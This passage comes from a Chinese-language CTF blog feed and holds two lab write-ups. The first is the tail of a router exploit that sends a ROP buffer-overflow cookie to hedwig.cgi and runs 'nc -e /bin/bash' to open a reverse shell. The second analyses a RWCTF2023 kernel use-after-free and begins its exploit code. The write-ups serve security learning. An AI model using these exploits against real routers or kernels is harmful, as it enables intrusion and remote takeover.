punctuation">,</span>bits<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./squashfs-root/lib/libc.so.0'</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span><span class="token number">0x77f34000</span>system<span class="token operator">=</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>gadget1<span class="token operator">=</span><span class="token number">0x158c8</span> <span class="token comment">#jalr s5; addiu s0,1</span>gadget2<span class="token operator">=</span><span class="token number">0x159cc</span> <span class="token comment">#addiu s5, sp, 0x10; jalr s0; move a0, s5</span>cmd<span class="token operator">=</span><span class="token string">b'nc -e /bin/bash 192.168.100.1 4321'</span>payload_header<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">'/htdocs/webinc/fatlady.php\nprefix=/runtime/session/'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token operator">-</span>payload_header<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#s0</span>payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token comment">#s1  </span>payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token comment">#s2</span>payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token comment">#s3</span>payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token comment">#s4</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span>gadget2<span class="token punctuation">)</span><span class="token comment">#s5</span>payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token comment">#s6</span>payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token comment">#s7</span>payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token comment">#fp</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span>gadget1<span class="token punctuation">)</span><span class="token comment">#ra</span>payload <span class="token operator">+=</span> <span class="token string">b'b'</span><span class="token operator">*</span><span class="token number">0x10</span>payload <span class="token operator">+=</span> cmdurl <span class="token operator">=</span> <span class="token string">"http://192.168.100.2:8888/hedwig.cgi"</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'X1NRI'</span><span class="token punctuation">:</span><span class="token string">'pwner'</span><span class="token punctuation">&#125;</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"Cookie"</span>        <span class="token punctuation">:</span> <span class="token string">b"uid="</span> <span class="token operator">+</span> payload<span class="token punctuation">,</span>    <span class="token string">"Content-Type"</span>  <span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">,</span>    <span class="token string">"Content-Length"</span><span class="token punctuation">:</span> <span class="token string">"11"</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">get_shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>sh<span class="token operator">=</span>listen<span class="token punctuation">(</span><span class="token number">4321</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>wait_for_connection<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>shell<span class="token operator">=</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>get_shell<span class="token punctuation">)</span>shell<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span> headers <span class="token operator">=</span> headers<span class="token punctuation">,</span> data <span class="token operator">=</span> data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆåŠŸåå¼¹shell<br><img src="/RW_FILE/053cc211b8474e14338fa9c4d53587e5_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> RealWorld </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IOT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RWCTF2023ä½“éªŒèµ› - Digging into kernel 3</title>
      <link href="/2024/04/10/RWCTF2023%E4%BD%93%E9%AA%8C%E8%B5%9B%20-%20Digging%20into%20kernel%203/"/>
      <url>/2024/04/10/RWCTF2023%E4%BD%93%E9%AA%8C%E8%B5%9B%20-%20Digging%20into%20kernel%203/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€é€†å‘åˆ†æ"><a href="#ä¸€ã€é€†å‘åˆ†æ" class="headerlink" title="ä¸€ã€é€†å‘åˆ†æ"></a>ä¸€ã€é€†å‘åˆ†æ</h1><h2 id="run-sh"><a href="#run-sh" class="headerlink" title="run.sh"></a>run.sh</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>qemu-system-x86_64 <span class="token punctuation">\</span><span class="token parameter variable">-m</span> 128M <span class="token punctuation">\</span><span class="token parameter variable">-nographic</span> <span class="token punctuation">\</span><span class="token parameter variable">-kernel</span> ./bzImage <span class="token punctuation">\</span><span class="token parameter variable">-initrd</span> ./rootfs.img <span class="token punctuation">\</span>-enable-kvm <span class="token punctuation">\</span><span class="token parameter variable">-cpu</span> kvm64,+smap,+smep <span class="token punctuation">\</span><span class="token parameter variable">-monitor</span> /dev/null <span class="token punctuation">\</span><span class="token parameter variable">-append</span> <span class="token string">'console=ttyS0 kaslr kpti=1 quiet oops=panic panic=1 init=/init'</span> <span class="token punctuation">\</span>-no-reboot <span class="token punctuation">\</span><span class="token parameter variable">-snapshot</span> <span class="token punctuation">\</span><span class="token parameter variable">-s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>kaslrã€kptiã€smepã€smap</p><h2 id="init"><a href="#init" class="headerlink" title="init"></a>init</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token function">mkdir</span> /tmp <span class="token function">mount</span> <span class="token parameter variable">-t</span> proc none /proc <span class="token function">mount</span> <span class="token parameter variable">-t</span> sysfs none /sys <span class="token function">mount</span> <span class="token parameter variable">-t</span> devtmpfs none /dev <span class="token function">mount</span> <span class="token parameter variable">-t</span> tmpfs none /tmp <span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>/dev/console<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">1</span>></span>/dev/console<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/consoleinsmod /rwctf.ko<span class="token function">chmod</span> <span class="token number">666</span> /dev/rwctf<span class="token function">chmod</span> <span class="token number">700</span> /flag<span class="token function">chmod</span> <span class="token number">400</span> /proc/kallsyms<span class="token builtin class-name">echo</span> <span class="token number">1</span> <span class="token operator">></span> /proc/sys/kernel/kptr_restrict<span class="token builtin class-name">echo</span> <span class="token number">1</span> <span class="token operator">></span> /proc/sys/kernel/dmesg_restrictpoweroff <span class="token parameter variable">-d</span> <span class="token number">120</span> <span class="token parameter variable">-f</span> <span class="token operator">&amp;</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Boot took <span class="token variable"><span class="token variable">$(</span><span class="token function">cut</span> -d<span class="token string">' '</span> <span class="token parameter variable">-f1</span> /proc/uptime<span class="token variable">)</span></span> seconds"</span> setsid /bin/cttyhack setuidgid <span class="token number">1000</span> /bin/sh<span class="token function">umount</span> /proc<span class="token function">umount</span> /sys<span class="token function">umount</span> /tmppoweroff <span class="token parameter variable">-d</span> <span class="token number">0</span> <span class="token parameter variable">-f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="rwctf-ko"><a href="#rwctf-ko" class="headerlink" title="rwctf.ko"></a>rwctf.ko</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATHSymbolsFORTIFYFortifiedFortifiableFILENo RELRO        Canary found      NX disabled   REL             No RPATH   No RUNPATH   48) Symbols  No00./rootfs/rwctf.ko<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æœ‰canary</p><p>éœ€è¦ä¼ å…¥çš„ç»“æ„ä½“ä¸º</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">request_t</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> idx<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> size<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ›å»ºäº†ä¸€ä¸ªæ··æ‚è®¾å¤‡<code>/dev/rwctf</code>ï¼Œåªå®šä¹‰äº†ioctlï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">rwmod_ioctl</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token class-name">request_t</span> <span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// r12</span>  __int64 idx<span class="token punctuation">;</span> <span class="token comment">// rbx</span>  __int64 v6<span class="token punctuation">;</span> <span class="token comment">// rdi</span>  <span class="token keyword">struct</span> <span class="token class-name">request_t</span> kbuf<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-18h]</span>  v8 <span class="token operator">=</span> <span class="token function">__readgsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>a3 <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">==</span> <span class="token number">0xC0DECAFE</span> <span class="token punctuation">)</span>                       <span class="token comment">// del</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>kbuf<span class="token punctuation">,</span> a3<span class="token punctuation">,</span> <span class="token number">16LL</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> kbuf<span class="token punctuation">.</span>idx <span class="token operator">&lt;=</span> <span class="token number">1u</span> <span class="token punctuation">)</span>      <span class="token function">kfree</span><span class="token punctuation">(</span>heaparray<span class="token punctuation">[</span>kbuf<span class="token punctuation">.</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment">// UAF</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  v3 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">==</span> <span class="token number">0xDEADBEEF</span> <span class="token punctuation">)</span>                       <span class="token comment">// add</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>kbuf<span class="token punctuation">,</span> a3<span class="token punctuation">,</span> <span class="token number">16LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    idx <span class="token operator">=</span> kbuf<span class="token punctuation">.</span>idx<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> kbuf<span class="token punctuation">.</span>idx <span class="token operator">></span> <span class="token number">1u</span> <span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    heaparray<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">_kmalloc</span><span class="token punctuation">(</span>kbuf<span class="token punctuation">.</span>size<span class="token punctuation">,</span> <span class="token number">3520LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v6 <span class="token operator">=</span> heaparray<span class="token punctuation">[</span>kbuf<span class="token punctuation">.</span>idx<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v6 <span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> kbuf<span class="token punctuation">.</span>size <span class="token operator">></span> <span class="token number">0x7FFFFFFFuLL</span> <span class="token punctuation">)</span>      <span class="token function">BUG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">copy_from_user</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> kbuf<span class="token punctuation">.</span>buf<span class="token punctuation">,</span> kbuf<span class="token punctuation">.</span>size<span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> v3<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€å¤šåªèƒ½ç”³è¯·ä¸¤ä¸ªï¼Œåªèƒ½å†…æ ¸å†™ï¼Œå­˜åœ¨UAF</p><p>æœ‰äº†ä¸€ä¸ªæ— é™å¤§å°UAFï¼Œæˆ‘ä»¬çš„åˆ©ç”¨æ€è·¯å°±å¤šç§å¤šæ ·äº†ã€‚æœ€å¤§çš„éš¾ç‚¹å…¶å®åœ¨äºå¦‚ä½•æ³„éœ²å†…æ ¸åŸºå€ï¼Œå› ä¸ºè¯¥å†…æ ¸æ¨¡å—æ²¡æœ‰è°ƒç”¨copy_to_userã€‚</p><p>æˆ‘é€‰æ‹©å †å–· user_key_payload è¶Šç•Œè¯»æ³„éœ²å†…æ ¸åŸºåœ°å€</p><p>ä½†æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜ï¼š<code>add_key()</code>å›æ˜¾åˆ†é…ä¸€ä¸ªobjæ‹·è´payloadåå†åˆ†é…å¦ä¸€ä¸ªobjä½œä¸ºuser_key_payloadï¼Œå¦‚æœæˆ‘ä»¬å…ˆåˆ†é…ä¸€ä¸ªobjå†é‡Šæ”¾ï¼Œè°ƒç”¨add_key()åˆ™è¯¥objä¸ä¼šç›´æ¥æˆä¸º<code>user_key_payload</code>è€Œæ˜¯åœ¨åç»­æ•°æ¬¡åˆ†é…ä¸­éƒ½ä½œä¸ºæ‹·è´payloadçš„ä¸´æ—¶objå­˜åœ¨ã€‚</p><p>å¯¹äºè¿™ä¸ªé¢˜ç›®æˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ†é…obj1å’Œobj2åå…¨éƒ¨é‡Šæ”¾ï¼Œåœ¨obj2ä¸Šè¿›è¡ŒUAFå°±è¡Œã€‚</p><h1 id="äºŒã€EXP"><a href="#äºŒã€EXP" class="headerlink" title="äºŒã€EXP"></a>äºŒã€EXP</h1><h2 id="EXP-user-key-payload-seq-operations-pt-regs"><a href="#EXP-user-key-payload-seq-operations-pt-regs" class="headerlink" title="EXP-user_key_payload+seq_operations+pt_regs"></a>EXP-user_key_payload+seq_operations+pt_regs</h2><p>æœ‰äº†ä¸€ä¸ªæ— é™å¤§å°UAFï¼Œæˆ‘ä»¬çš„åˆ©ç”¨æ€è·¯å°±å¤šç§å¤šæ ·äº†</p><p>é€šè¿‡æµ‹è¯•ï¼š</p><ul><li>å…³é—­äº†Â <code>CONFIG_MEMCG_KMEM</code>ï¼Œè¿™ä½¿å¾—<code>GFP_KERNEL</code>Â ä¸Â <code>GFP_KERNEL_ACCOUNT</code>Â ä¼šä»åŒæ ·çš„Â <code>kmalloc-xx</code>Â ä¸­è¿›è¡Œåˆ†é…</li><li>å…³é—­äº†Â <code>CONFIG_RANDOMIZE_KSTACK_OFFSET</code>ï¼Œè¿™ä½¿å¾—å›ºå®šå‡½æ•°è°ƒç”¨åˆ°å†…æ ¸æ ˆåº•çš„åç§»å€¼æ˜¯ä¸å˜çš„</li><li>å…³é—­äº†Â <code>SLAB_FREELIST_HARDENED</code>ï¼Œè¿™ä½¿å¾— freelist å‡ ä¹æ²¡æœ‰ä»»ä½•ä¿æŠ¤ï¼Œæˆ‘ä»¬å¯ä»¥è½»æ˜“å®Œæˆä»»æ„åœ°å€åˆ†é… + ä»»æ„åœ°å€è¯»å†™</li></ul><p>æœ€å¤§çš„éš¾ç‚¹å…¶å®åœ¨äºå¦‚ä½•æ³„éœ²å†…æ ¸åŸºå€ï¼Œå› ä¸ºè¯¥å†…æ ¸æ¨¡å—æ²¡æœ‰è°ƒç”¨copy_to_userã€‚</p><p>åœ¨å†…æ ¸å½“ä¸­å­˜åœ¨ä¸€ä¸ªç”¨äºå¯†é’¥ç®¡ç†çš„å­ç³»ç»Ÿï¼Œå†…æ ¸æä¾›äº†Â <code>add_key()</code>Â ç³»ç»Ÿè°ƒç”¨è¿›è¡Œå¯†é’¥çš„åˆ›å»ºï¼Œå¹¶æä¾›äº†Â <code>keyctl()</code>Â ç³»ç»Ÿè°ƒç”¨è¿›è¡Œå¯†é’¥çš„è¯»å–ã€æ›´æ–°ã€é”€æ¯ç­‰åŠŸèƒ½</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">        <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>        <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;keyutils.h></span></span>        <span class="token class-name">key_serial_t</span> <span class="token function">add_key</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>type<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>description<span class="token punctuation">,</span>                                    <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>payload<span class="token punctuation">,</span> <span class="token class-name">size_t</span> plen<span class="token punctuation">,</span>                                    <span class="token class-name">key_serial_t</span> keyring<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//...</span>       <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;asm/unistd.h></span></span>       <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/keyctl.h></span></span>       <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>       <span class="token keyword">long</span> <span class="token function">syscall</span><span class="token punctuation">(</span>__NR_keyctl<span class="token punctuation">,</span> <span class="token keyword">int</span> operation<span class="token punctuation">,</span> __kernel_ulong_t arg2<span class="token punctuation">,</span>                    __kernel_ulong_t arg3<span class="token punctuation">,</span> __kernel_ulong_t arg4<span class="token punctuation">,</span>                    __kernel_ulong_t arg5<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“æˆ‘ä»¬è°ƒç”¨Â <code>add_key()</code>Â åˆ†é…ä¸€ä¸ªå¸¦æœ‰Â <code>description</code>Â å­—ç¬¦ä¸²çš„ã€ç±»å‹ä¸ºÂ <code>&quot;user&quot;</code>Â çš„ã€é•¿åº¦ä¸ºÂ <code>plen</code>Â çš„å†…å®¹ä¸ºÂ <code>payload</code>Â çš„å¯†é’¥æ—¶ï¼Œå†…æ ¸ä¼šç»å†å¦‚ä¸‹è¿‡ç¨‹ï¼š</p><ul><li>é¦–å…ˆä¼šåœ¨å†…æ ¸ç©ºé—´ä¸­åˆ†é… obj 1 ä¸ obj2ï¼Œåˆ†é… flag ä¸ºÂ <code>GFP_KERNEL</code>ï¼Œç”¨ä»¥ä¿å­˜Â <code>description</code>Â ï¼ˆå­—ç¬¦ä¸²ï¼Œæœ€å¤§å¤§å°ä¸º 4096ï¼‰ã€<code>payload</code>Â ï¼ˆæ™®é€šæ•°æ®ï¼Œå¤§å°æ— é™åˆ¶ï¼‰</li><li>åˆ†é… obj3 ä¿å­˜Â <code>description</code>Â ï¼Œåˆ†é… obj4 ä¿å­˜Â <code>payload</code>ï¼Œåˆ†é… flag çš†ä¸ºÂ <code>GFP_KERNEL</code></li><li>é‡Šæ”¾ obj1 ä¸ obj2ï¼Œè¿”å›å¯†é’¥ id</li></ul><p>å…¶ä¸­ obj4 ä¸ºä¸€ä¸ªÂ <code>user_key_payload</code>Â ç»“æ„ä½“ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">user_key_payload</span> <span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">rcu_head</span>rcu<span class="token punctuation">;</span><span class="token comment">/* RCU destructor */</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span>datalen<span class="token punctuation">;</span><span class="token comment">/* length of this data */</span><span class="token keyword">char</span>data<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">__aligned</span><span class="token punctuation">(</span><span class="token function">__alignof__</span><span class="token punctuation">(</span>u64<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* actual data */</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//...</span><span class="token keyword">struct</span> <span class="token class-name">callback_head</span> <span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">callback_head</span> <span class="token operator">*</span>next<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>func<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">callback_head</span> <span class="token operator">*</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">aligned</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">rcu_head</span> <span class="token expression">callback_head</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>keyctl()</code>Â ç³»ç»Ÿè°ƒç”¨ä¸ºæˆ‘ä»¬æä¾›äº†è¯»å–ã€æ›´æ–°ï¼ˆåˆ†é…æ–°å¯¹è±¡ï¼Œé‡Šæ”¾æ—§å¯¹è±¡ï¼‰ã€é”€æ¯å¯†é’¥ï¼ˆé‡Šæ”¾ payloadï¼‰çš„åŠŸèƒ½ï¼Œå…¶ä¸­è¯»å–çš„æœ€å¤§é•¿åº¦ç”±Â <code>user_key_payload-&gt;datalen</code>Â å†³å®šï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨é¢˜ç›®æä¾›çš„ UAF å°†<code>user_key_payload-&gt;datalen</code>Â æ”¹å¤§ï¼Œä»è€Œå®Œæˆè¶Šç•Œè¯»</p><p>æ³¨æ„ä»¥ä¸‹ä¸¤ç‚¹ï¼š</p><ul><li>è¿™é‡Œæˆ‘ä»¬çš„ description å­—ç¬¦ä¸²éœ€è¦å’Œ payload æœ‰ç€ä¸åŒçš„é•¿åº¦ï¼Œä»è€Œç®€åŒ–åˆ©ç”¨æ¨¡å‹</li><li>è¯»å– key æ—¶çš„ len åº”å½“<strong>ä¸å°äº user_key_payload-&gt;datalenï¼Œå¦åˆ™ä¼šè¯»å–å¤±è´¥</strong></li></ul><p><code>add_key()</code>å›æ˜¾åˆ†é…ä¸€ä¸ªobjæ‹·è´payloadåå†åˆ†é…å¦ä¸€ä¸ªobjä½œä¸ºuser_key_payloadï¼Œå¦‚æœæˆ‘ä»¬å…ˆåˆ†é…ä¸€ä¸ªobjå†é‡Šæ”¾ï¼Œè°ƒç”¨add_key()åˆ™è¯¥objä¸ä¼šç›´æ¥æˆä¸º<code>user_key_payload</code>è€Œæ˜¯åœ¨åç»­æ•°æ¬¡åˆ†é…ä¸­éƒ½ä½œä¸ºæ‹·è´payloadçš„ä¸´æ—¶objå­˜åœ¨ã€‚</p><p>å¯¹äºè¿™ä¸ªé¢˜ç›®æˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ†é…obj1å’Œobj2åå…¨éƒ¨é‡Šæ”¾ï¼Œåœ¨obj2ä¸Šè¿›è¡ŒUAFå°±è¡Œã€‚ç„¶åæ‰“seq_operationsèµ°pt_regs</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">_GNU_SOURCE</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/keyctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/syscall.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_ADD</span> <span class="token expression"><span class="token number">0xDEADBEEF</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_DEL</span> <span class="token expression"><span class="token number">0xC0DECAFE</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SEQ_SZ</span> <span class="token expression"><span class="token 